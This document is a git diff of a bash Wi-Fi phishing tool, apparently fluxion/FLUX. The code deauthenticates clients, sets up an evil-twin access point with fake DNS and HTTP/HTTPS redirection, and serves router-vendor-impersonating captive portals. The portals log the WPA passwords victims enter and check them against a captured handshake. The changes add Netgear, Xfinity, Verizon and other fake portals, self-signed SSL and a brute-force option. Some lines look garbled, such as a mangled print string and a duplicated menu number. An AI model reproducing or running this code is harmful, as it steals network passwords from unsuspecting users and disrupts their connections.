 		echo -n '      #> '
 		read yn
-		
+
 		case $yn in
 			1 ) checkhandshake;;
-			2 ) capture; $DEAUTH & ;;
-			3 ) conditional_clear; askclientsel; break;;
-			4 ) killall airodump-ng &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
-			5 ) exitmode; break;;
+			2 ) conditional_clear; askclientsel; break;;
+			3 ) killall airodump-ng mdk3 aireplay-ng &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
+			4 ) exitmode; break;;
 			* ) echo "
-Unknown option. Choose again"; conditional_clear ;;
+$general_case_error"; conditional_clear ;;
 		esac
-		
+
 	done
 }
 
 # Capture all
 function capture {
-	
+
 	conditional_clear
 	if ! ps -A | grep -q airodump-ng; then
-		
+
 		rm -rf $DUMP_PATH/$Host_MAC*
 		xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
 	fi
@@ -2361,119 +3430,173 @@ function capture {
 
 # Check the handshake before continuing
 function checkhandshake {
-	
+
 	if [ "$handshakemode" = "normal" ]; then
 		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
-			killall airodump-ng &>$flux_output_device
+			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			wpaclean $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
-			webinterface
+			certssl
+			i=2
 			break
+
 		else
 			Handshake_statuscheck="${red}Not_Found$transparent"
+
 		fi
 	elif [ "$handshakemode" = "hard" ]; then
 		pyrit -r $DUMP_PATH/$Host_MAC-01.cap -o $DUMP_PATH/test.cap stripLive &>$flux_output_device
-		
+
 		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
-			killall airodump-ng &>$flux_output_device
+			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap strip &>$flux_output_device
-			webinterface
+			certssl
+			i=2
 			break
+
 		else
 			if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
 				Handshake_statuscheck="${yellow}Corrupted$transparent"
 			else
 				Handshake_statuscheck="${red}Not_found$transparent"
+
 			fi
 		fi
-		
+
 		rm $DUMP_PATH/test.cap &>$flux_output_device
 	fi
+
 }
 
 ############################################# < HANDSHAKE > ############################################
 
+# function for ssl
+function certssl {
+# Test if the ssl certificate is generated correcly if there is any
 
+		if [ -f /root/server.pem ]; then
+		if [ -s /root/server.pem ]; then
 
+		webinterface
+		break
+	else
+		conditional_clear
+		top
+		echo "                                       "
+		echo "  Certificate invalid or not present, please choice"
+		echo "                                       "
+		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
+		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again 
+		echo -e "      "$blue"3)"$red" Exit" $transparent
+		echo " "
+		echo -n '      #> '
+		read yn
 
+		case $yn in
+			1 ) creassl;;
+			2 ) certssl;break;;
+			3 ) exitmode; break;;
+			* ) echo "$general_case_error"; conditional_clear
+		esac
+		fi
+	else
+		while true; do
+		conditional_clear
+		top
+		echo "                                    	                            "
+		echo "  Certificate invalid or not present, please choice"
+		echo "                                       "
+		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
+		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again 
+		echo -e "      "$blue"3)"$red" Exit" $transparent
+		echo " "
+		echo -n '      #> '
+		read yn
+		
+		case $yn in
+			1 ) creassl;;
+			2 ) certssl; break;;
+			3 ) exitmode; break;;
+			* ) echo "$general_case_error"; conditional_clear
+		esac
+		
+	done
+		
+	fi
+	
 
+}
+
+# Create Self-Signed SSL Certificate
+function creassl {
+	xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /root/server.pem -out /root/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
+	certssl
+}
 
 ############################################# < ATAQUE > ############################################
 
 # Select web interface that will be used
 function webinterface {
-	
+
+#Establece Permisos al Certificado ssl Autofirmado
+	chmod 400 $DUMP_PATH/server.pem
+
 	while true; do
 		conditional_clear
-		mostrarheader
-		
+		top
+
 		infoap
 		echo
-		echo "Select Web Interface"
+		echo "$header_webinterface"
 		echo
-		
+
 		echo -e "$blue""      1)"$transparent" Web Interface"
         echo -e "$blue""      2)"$transparent" Template Web Interface"
-		echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""
-		
+		echo -e "$blue""      3)"$transparent" Bruteforce"
+        echo -e "$blue""      4)"$transparent" \e[1;31mExit"$transparent""
 		echo
 		echo -n "#? "
 		read yn
 		case $yn in
-		1 ) matartodo; Menu; break;;
-		2 ) matartodo; MenuTemplate; break;;
-        3 ) matartodo; exitmode; break;;
-		esac
+            1 ) matartodo; ConnectionRESET; selection; break;;
+            2 ) matartodo; MenuTemplate; break;;
+            3 ) matartodo; Bruteforce2; break;;
+            4 ) matartodo; exitmode; break;;
+        esac
 	done
 }
 
-function Menu {
-        while true; do
-
-            mostrarheader
-    
-            echo "Select Login Page"
-            echo "                                       "
-                  echo -e "$blue""      1)"$transparent" Connection Reset [RECOMMENDED]" 
-                  echo -e "$blue""      2)"$transparent" Login Pages"
-                  echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""
-                echo " "
-            echo -n '      #> '
-            read yn
-            case $yn in
-            1 ) matartodo; ConnectionRESET; selection; break;;
-            2 ) matartodo; LoginPages ;selection; break;;
-            3 ) matartodo; exitmode; break;;
-            * ) echo "Unknown option. Choose again"; conditional_clear ;;
-        esac
-    done
-}
-
-
 function ConnectionRESET {
-
-		while true; do 
+		while true; do
 			conditional_clear
-			mostrarheader
-			
-
+			top
 			infoap
 			echo
-			echo "SELECT LANGUAGE"
+			echo "$header_ConnectionRESET"
 			echo
+
+			echo -e "$blue""1)"$transparent"  English     [ENG](NEUTRA)"
+			echo -e "$blue""2)"$transparent"  Netgear     [ENG]"
+			echo -e "$blue""3)"$transparent"  Belkin      [ENG]"
+			echo -e "$blue""4)"$transparent"  Arris       [ENG]"
+			echo -e "$blue""5)"$transparent"  Verizon     [ENG]"
+			echo -e "$blue""6)"$transparent"  Xfinity     [ENG]"
+			echo -e "$blue""7)"$transparent"  Huawei      [ENG]"
+			echo -e "$blue""8)"$transparent"  Spanish     [ESP](NEUTRA)"
+			echo -e "$blue""9)"$transparent"  Netgear     [ESP]"
+			echo -e "$blue""10)"$transparent" Arris       [ESP]"
+			echo -e "$blue""11)"$transparent" Vodafone    [ESP]"
+			echo -e "$blue""12)"$transparent" Italian     [IT]"
+			echo -e "$blue""13)"$transparent" French      [FR]"
+			echo -e "$blue""13)"$transparent" Portuguese  [POR]"
+			echo -e "$blue""15)"$transparent" German      [GER]"
+			echo -e "$blue""16)"$transparent" Chinese     [ZH_CN](NEUTRA)"
+			echo -e "$blue""17)"$transparent"\e[1;31m $general_back"$transparent""
 			
-			echo -e "$blue""1)"$transparent" English     [ENG]"
-			echo -e "$blue""2)"$transparent" Spanish     [ESP]"
-			echo -e "$blue""3)"$transparent" Italian     [IT]"
-			echo -e "$blue""4)"$transparent" French      [FR]"
-			echo -e "$blue""5)"$transparent" Portuguese  [POR]"
-			echo -e "$blue""6)"$transparent" German      [GER]"
-			echo -e "$blue""7)"$transparent" \e[1;31mBack"$transparent""
-			echo 
+			echo
 			echo -n "#? "
 			read fluxass
 			language=${webinterfaceslenguage[$line]}
-			
+
 			if [ "$fluxass" = "1" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
@@ -2486,9 +3609,31 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-				
-
 			elif [ "$fluxass" = "2" ]; then
+                                NETGEAR
+                                break
+
+                        elif [ "$fluxass" = "3" ]; then
+                                BELKIN
+                                break
+
+                        elif [ "$fluxass" = "4" ]; then
+                                ARRIS
+                                break
+
+                        elif [ "$fluxass" = "5" ]; then
+                                VERIZON
+                                break
+
+                        elif [ "$fluxass" = "6" ]; then
+                                XFINITY
+                                break
+
+                                elif [ "$fluxass" = "7" ]; then
+                                HUAWEI
+                                break
+
+			elif [ "$fluxass" = "8" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
@@ -2499,7 +3644,20 @@ function ConnectionRESET {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
 				NEUTRA
 				break
-			elif [ "$fluxass" = "3" ]; then
+
+			elif [ "$fluxass" = "9" ]; then
+                                NETGEAR2
+                                break
+
+			elif [ "$fluxass" = "10" ]; then
+                                ARRIS2
+                                break
+
+                        elif [ "$fluxass" = "11" ]; then
+                                VODAFONE
+                                break
+
+			elif [ "$fluxass" = "12" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
@@ -2510,7 +3668,7 @@ function ConnectionRESET {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
 				NEUTRA
 				break
-			elif [ "$fluxass" = "4" ]; then
+			elif [ "$fluxass" = "13" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
@@ -2521,7 +3679,7 @@ function ConnectionRESET {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
 				NEUTRA
 				break
-			elif [ "$fluxass" = "5" ]; then
+			elif [ "$fluxass" = "14" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
@@ -2533,7 +3691,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-				elif [ "$fluxass" = "6" ]; then
+			elif [ "$fluxass" = "15" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_GER
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_GER
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_GER
@@ -2544,15 +3702,29 @@ function ConnectionRESET {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_GER
 				NEUTRA
 				break
-			elif [ "$fluxass" = "7" ]; then
+
+			
+            elif [ "$fluxass" = "16" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ZH
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ZH
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ZH
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ZH
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ZH
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ZH
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ZH
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ZH
+				NEUTRA
+				break
+
+			
+            elif [ "$fluxass" = "17" ]; then
 				continue
 			fi
-		
+
 	done
 	preattack
 	attack
 }
-
 
 function LoginPages {
 	
@@ -2606,8 +3778,9 @@ function MenuTemplate {
               echo -e "$blue""      14)"$transparent" Telecom"
               echo -e "$blue""      15)"$transparent" TPLink"
               echo -e "$blue""      16)"$transparent" Zyxel"
+              echo -e "$blue""      17)"$transparent" ADB Epicentro"              
               
-              echo -e "$blue""      17)"$transparent" \e[1;31mExit"$transparent""
+              echo -e "$blue""      18)"$transparent" \e[1;31mExit"$transparent""
             echo " "
         echo -n '      #> '
         read yn
@@ -2628,16 +3801,18 @@ function MenuTemplate {
             14 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/telecom"; template; selection; break;;
             15 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/tplink"; template; selection; break;;
             16 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/zyxel"; template; selection; break;;
+            17 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/adb_epicentro"; template; selection; break;;
             
-            17 ) matartodo; exitmode; break;;
+            18 ) matartodo; exitmode; break;;
             * ) echo "Unknown option. Choose again"; conditional_clear ;;
         esac
     done
 }
 
+
 # Create different settings required for the script
 function preattack {
-	
+
 # Config HostAPD
 echo "interface=$WIFI
 driver=nl80211
@@ -2667,7 +3842,7 @@ fclose(\$fp);
 \$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
 
 
-// Marge all the variables with text in a single variable. 
+// Marge all the variables with text in a single variable.
 \$f_data= ''.\$key1.'';
 
 \$pwlog = fopen(\$attemptlog, \"w\");
@@ -2678,12 +3853,12 @@ fclose(\$pwlog);
 
 if ( (strlen(\$key1) < 8) ) {
 echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MIN\\\");window.history.back()</script>\";
-break;
+return;
 }
 
 if ( (strlen(\$key1) > 63) ) {
 echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MAX\\\");window.history.back()</script>\";
-break;
+return;
 }
 
 
@@ -2697,19 +3872,19 @@ fclose(\$file);
 fwrite(\$archivo,\"\n\");
 fclose(\$archivo);
 
-while(1) 
+while(1)
 {
 
 if (file_get_contents(\"\$intento\") == 2) {
-	    header(\"location:final.html\");
+	    header(\"Location:final.html\");
 	    break;
-	} 
+	}
 if (file_get_contents(\"\$intento\") == 1) {
-	    header(\"location:error.html\");
+	    header(\"Location:error.html\");
 	    unlink(\$intento);
 	    break;
 	}
-	
+
 sleep(1);
 }
 
@@ -2730,13 +3905,13 @@ option domain-name-servers $IP;
 
 range $RANG_IP.100 $RANG_IP.250;
 
-} 
+}
 " >$DUMP_PATH/dhcpd.conf
 
 #create an empty leases file
 touch $DUMP_PATH/dhcpd.leases
 
-# creates Lighttpd web-server 
+# creates Lighttpd web-server
 echo "server.document-root = \"$DUMP_PATH/data/\"
 
 server.modules = (
@@ -2746,7 +3921,7 @@ server.modules = (
   \"mod_fastcgi\",
   \"mod_redirect\",
   \"mod_rewrite\"
-) 
+)
 
 fastcgi.server = ( \".php\" => ((
 		  \"bin-path\" => \"/usr/bin/php-cgi\",
@@ -2767,15 +3942,24 @@ mimetype.assign = (
 \".css\" => \"text/css\"
 )
 
-
 server.error-handler-404 = \"/\"
 
 static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
 index-file.names = ( \"index.html\", \"index.htm\", \"index.php\" )
 
+\$SERVER[\"socket\"] == \":443\" {
+	url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
+	ssl.engine                  = \"enable\" 
+	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+   
+}
+
 #Redirect www.domain.com to domain.com
 \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+	ssl.engine                  = \"enable\" 
+	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+	
 }
 
 " >$DUMP_PATH/lighttpd.conf
@@ -2788,8 +3972,8 @@ class DNSQuery:
     self.data=data
     self.dominio=''
 
-    tipo = (ord(data[2]) >> 3) & 15   
-    if tipo == 0:                    
+    tipo = (ord(data[2]) >> 3) & 15
+    if tipo == 0:
       ini=12
       lon=ord(data[ini])
       while lon != 0:
@@ -2801,20 +3985,20 @@ class DNSQuery:
     packet=''
     if self.dominio:
       packet+=self.data[:2] + \"\x81\x80\"
-      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   
-      packet+=self.data[12:]                                         
-      packet+='\xc0\x0c'                                             
-      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             
-      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) 
+      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
+      packet+=self.data[12:]
+      packet+='\xc0\x0c'
+      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
+      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
     return packet
 
 if __name__ == '__main__':
   ip='$IP'
-  print 'pyminifakeDNS:: dom.query. 60 IN A %s' % ip
+  print 'pyminifakeDfluxassNS:: dom.query. 60 IN A %s' % ip
 
   udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   udps.bind(('',53))
-  
+
   try:
     while 1:
       data, addr = udps.recvfrom(1024)
@@ -2826,42 +4010,43 @@ if __name__ == '__main__':
     udps.close()
 " >$DUMP_PATH/fakedns
 chmod +x $DUMP_PATH/fakedns
-	
+
 }
 
-# Set up DHCP / WEB server 
+# Set up DHCP / WEB server
 function routear {
-	
+
 	ifconfig $interfaceroutear up
 	ifconfig $interfaceroutear $IP netmask 255.255.255.0
-	
+
 	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
 	sysctl -w net.ipv4.ip_forward=1 &>$flux_output_device
-	
+
 	iptables --flush
 	iptables --table nat --flush
 	iptables --delete-chain
 	iptables --table nat --delete-chain
 	iptables -P FORWARD ACCEPT
-	
+
 	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
+	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
 	iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
-# Attack 
+# Attack
 function attack {
-	
+
 	if [ "$fakeapmode" = "hostapd" ]; then
 		interfaceroutear=$WIFI
 	elif [ "$fakeapmode" = "airbase-ng" ]; then
 		interfaceroutear=at0
 	fi
-	
+
 	handshakecheck
 	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
-	
+
 	if [ "$fakeapmode" = "hostapd" ]; then
-		
+
 		ifconfig $WIFI down
 		sleep 0.4
 		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $flux_output_device
@@ -2869,8 +4054,8 @@ function attack {
 		ifconfig $WIFI up
 		sleep 0.4
 	fi
-	
-	
+
+
 	if [ $fakeapmode = "hostapd" ]; then
 		killall hostapd &> $flux_output_device
 		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
@@ -2879,33 +4064,33 @@ function attack {
 		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
 	fi
 	sleep 5
-	
+
 	routear &
 	sleep 3
-	
-	
+
+
 	killall dhcpd &> $flux_output_device
 	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
 	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $flux_output_device
 	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python $DUMP_PATH/fakedns &
-	
+
 	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $flux_output_device
 	lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
-	
+
 	killall aireplay-ng &> $flux_output_device
 	killall mdk3 &> $flux_output_device
 	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
-	
+
 	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
 	conditional_clear
-	
+
 	while true; do
-		mostrarheader
-		
+		top
+
 		echo "Attack in progress .."
 		echo "                                       "
-		echo "      1) Choose another network" 
+		echo "      1) Choose another network"
 		echo "      2) Exit"
 		echo " "
 		echo -n '      #> '
@@ -2914,31 +4099,31 @@ function attack {
 			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
 			2 ) matartodo; exitmode; break;;
 			* ) echo "
-Unknown option. Choose again"; conditional_clear ;;
+$general_case_error"; conditional_clear ;;
 		esac
 	done
-	
+
 }
 
 # Checks the validity of the password
 function handshakecheck {
-	
+
 	echo "#!/bin/bash
-	
+
 	echo > $DUMP_PATH/data.txt
 	echo -n \"0\"> $DUMP_PATH/hit.txt
 	echo "" >$DUMP_PATH/loggg
-	
+
 	tput civis
 	clear
-	
+
 	minutos=0
 	horas=0
 	i=0
 	timestamp=\$(date +%s)
-	
+
 	while true; do
-	
+
 	segundos=\$i
 	dias=\`expr \$segundos / 86400\`
 	segundos=\`expr \$segundos % 86400\`
@@ -2946,19 +4131,19 @@ function handshakecheck {
 	segundos=\`expr \$segundos % 3600\`
 	minutos=\`expr \$segundos / 60\`
 	segundos=\`expr \$segundos % 60\`
-	
+
 	if [ \"\$segundos\" -le 9 ]; then
 	is=\"0\"
 	else
 	is=
 	fi
-	
+
 	if [ \"\$minutos\" -le 9 ]; then
 	im=\"0\"
 	else
 	im=
 	fi
-	
+
 	if [ \"\$horas\" -le 9 ]; then
 	ih=\"0\"
 	else
@@ -2967,21 +4152,21 @@ function handshakecheck {
 
 	if [ $authmode = "handshake" ]; then
 		echo "if [ -f $DUMP_PATH/pwattempt.txt ]; then
-		cat $DUMP_PATH/pwattempt.txt >> $PASSLOG_PATH/$Host_SSID-$Host_MAC.log
+		cat $DUMP_PATH/pwattempt.txt >> \"$PASSLOG_PATH/$Host_SSID-$Host_MAC.log\"
 		rm -f $DUMP_PATH/pwattempt.txt
 		fi
-		
+
 		if [ -f $DUMP_PATH/intento ]; then
-		
+
 		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
 		echo \"2\">$DUMP_PATH/intento
 		break
 		else
 		echo \"1\">$DUMP_PATH/intento
 		fi
-		
+
 		fi">>$DUMP_PATH/handcheck
-		
+
 	elif [ $authmode = "wpa_supplicant" ]; then
 		  echo "
 		if [ -f $DUMP_PATH/pwattempt.txt ]; then
@@ -2991,22 +4176,22 @@ function handshakecheck {
 
 		wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
 		wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
-		
+
 		if [ -f $DUMP_PATH/intento ]; then
-		
+
 		if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
 		echo \"2\">$DUMP_PATH/intento
 		break
 		else
 		echo \"1\">$DUMP_PATH/intento
 		fi
-		
+
 		fi
 		">>$DUMP_PATH/handcheck
 	fi
-	
+
 	echo "readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - $RANG_IP.100-110 2>&1 | grep Host )
-	
+
 	echo
 	echo -e \"  ACCESS POINT:\"
 	echo -e \"    SSID............: "$white"$Host_SSID"$transparent"\"
@@ -3015,52 +4200,52 @@ function handshakecheck {
 	echo -e \"    Vendor..........: "$green"$Host_MAC_MODEL"$transparent"\"
 	echo -e \"    Operation time..: "$blue"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
 	echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
-	echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | sort| uniq | wc -l)"$transparent"\"
+	echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
 	echo
 	echo -e \"  CLIENTS ONLINE:\"
-	
+
 	x=0
 	for cliente in \"\${CLIENTESDHCP[@]}\"; do
 	  x=\$((\$x+1))
 	  CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
 	  CLIENTE_MAC=\$(nmap -PR -sn -n \$CLIENTE_IP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])
-	  
+
 	  if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
 		CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
 	  fi
-	  
+
 	  CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
-	  
+
 	  if echo \$CLIENTE_MAC| grep -q x; then
 		    CLIENTE_FABRICANTE=\"unknown\"
 	  fi
-	  
+
 	  CLIENTE_HOSTNAME=\$(grep \$CLIENTE_IP $DUMP_PATH/clientes.txt | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')
-	  
-	  echo -e \"    $green \$x) $red\$CLIENTE_IP $yellow\$CLIENTE_MAC $transparent($blue\$CLIENTE_FABRICANTE$transparent) $green \$CLIENTE_HOSTNAME$transparent\"   
+
+	  echo -e \"    $green \$x) $red\$CLIENTE_IP $yellow\$CLIENTE_MAC $transparent($blue\$CLIENTE_FABRICANTE$transparent) $green \$CLIENTE_HOSTNAME$transparent\"
 	done
-	
+
 	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
-	
-	
+
+
 	if [ $authmode = "handshake" ]; then
 		echo "let i=\$(date +%s)-\$timestamp
 		sleep 1">>$DUMP_PATH/handcheck
-		
+
 	elif [ $authmode = "wpa_supplicant" ]; then
 		echo "sleep 5
-		
+
 		killall wpa_supplicant &>$flux_output_device
 		killall wpa_passphrase &>$flux_output_device
 		let i=\$i+5">>$DUMP_PATH/handcheck
 	fi
-	
+
 	echo "done
 	clear
 	echo \"1\" > $DUMP_PATH/status.txt
-	
+
 	sleep 7
-	
+
 	killall mdk3 &>$flux_output_device
 	killall aireplay-ng &>$flux_output_device
 	killall airbase-ng &>$flux_output_device
@@ -3070,27 +4255,27 @@ function handshakecheck {
 	killall dhcpd &>$flux_output_device
 	killall wpa_supplicant &>$flux_output_device
 	killall wpa_passphrase &>$flux_output_device
-	
+
 	echo \"
 	FLUX $version by deltax
-	
+
 	SSID: $Host_SSID
 	BSSID: $Host_MAC ($Host_MAC_MODEL)
 	Channel: $Host_CHAN
 	Security: $Host_ENC
 	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
 	Password: \$(cat $DUMP_PATH/data.txt)
-	\" >$HOME/$Host_SSID-password.txt">>$DUMP_PATH/handcheck
-	
-	
+	\" >\"$HOME/$Host_SSID-password.txt\"">>$DUMP_PATH/handcheck
+
+
 	if [ $authmode = "handshake" ]; then
-		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\" 
+		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"
 		">>$DUMP_PATH/handcheck
-		
+
 	elif [ $authmode = "wpa_supplicant" ]; then
 		echo "echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
 	fi
-	
+
 	echo "kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &>$flux_output_device">>$DUMP_PATH/handcheck
 	chmod +x $DUMP_PATH/handcheck
 }
@@ -3107,36 +4292,34 @@ function handshakecheck {
 
 # Deauth all
 function deauthall {
-	
+
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 function deauthmdk3 {
-	
+
 	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
-	sleep 15
-	kill $mdk3PID &>$flux_output_device
 }
 
 # Deauth to a specific target
 function deauthesp {
-	
+
 	sleep 2
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
 }
